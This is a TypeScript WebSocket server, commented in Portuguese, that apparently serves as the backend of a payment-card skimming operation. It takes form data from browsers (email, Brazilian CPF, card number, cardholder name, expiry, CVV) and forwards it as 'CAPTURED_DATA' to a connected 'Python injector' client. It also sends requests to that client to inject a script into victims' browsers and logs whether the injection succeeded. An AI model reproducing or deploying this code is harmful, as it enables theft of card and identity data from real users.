import { WebSocket } from "ws";

interface ConnectedClient {
  ws: WebSocket;
  id: string;
  type: "python" | "browser";
}

let clients: ConnectedClient[] = [];

export function setupWebSocketHandlers(wss: any) {
  wss.on("connection", (ws: WebSocket) => {
    const clientId = Math.random().toString(36).substring(7);

    console.log(`🔗 Nova conexão WebSocket: ${clientId}`);

    ws.on("message", (message: string) => {
      try {
        const data = JSON.parse(message);

        // Identifica o tipo de cliente
        if (data.type === "PYTHON_INJECTOR") {
          const existingIndex = clients.findIndex((c) => c.type === "python");
          if (existingIndex !== -1) {
            clients[existingIndex].ws.close();
            clients.splice(existingIndex, 1);
          }

          clients.push({ ws, id: clientId, type: "python" });
          console.log("✅ Cliente Python conectado (Injetor)");
          ws.send(
            JSON.stringify({ type: "ACK", message: "Conectado ao backend" }),
          );
        } else if (data.type === "CARD_DATA_UPDATE") {
          // Dados do formulário vindo do navegador
          console.log("📊 Dados de formulário recebidos:", {
            email: data.payload.email ? "✅" : "❌",
            cpf: data.payload.cpf ? "✅" : "❌",
            cardNumber: data.payload.cardNumber ? "✅" : "❌",
            cardholderName: data.payload.cardholderName ? "✅" : "❌",
            expiryMonth: data.payload.expiryMonth ? "✅" : "❌",
            expiryYear: data.payload.expiryYear ? "✅" : "❌",
            cvv: data.payload.cvv ? "✅" : "❌",
          });

          // Envia para o cliente Python se estiver conectado
          const pythonClient = clients.find((c) => c.type === "python");
          if (pythonClient) {
            pythonClient.ws.send(
              JSON.stringify({
                type: "CAPTURED_DATA",
                payload: data.payload,
              }),
            );
          }
        } else if (data.type === "INJECT_RESPONSE") {
          // Resposta do Python sobre injeção
          if (data.success) {
            console.log("✅ Script injetado com sucesso no navegador");
          } else {
            console.log("❌ Falha ao injetar script");
          }
        }
      } catch (error) {
        console.error("❌ Erro ao processar mensagem:", error);
      }
    });

    ws.on("close", () => {
      const index = clients.findIndex((c) => c.id === clientId);
      if (index !== -1) {
        const clientType = clients[index].type;
        clients.splice(index, 1);
        console.log(`❌ Cliente ${clientType} desconectado: ${clientId}`);
      }
    });

    ws.on("error", (error) => {
      console.error(`❌ Erro WebSocket ${clientId}:`, error.message);
    });
  });
}

export function requestBrowserInjection() {
  const pythonClient = clients.find((c) => c.type === "python");
  if (pythonClient && pythonClient.ws.readyState === 1) {
    pythonClient.ws.send(
      JSON.stringify({
        type: "INJECT_REQUEST",
        timestamp: new Date().toISOString(),
      }),
    );
    console.log("📨 Requisição de injeção enviada ao Python");
    return true;
  }
  return false;
}

export function getCapturedData() {
  return clients;
}
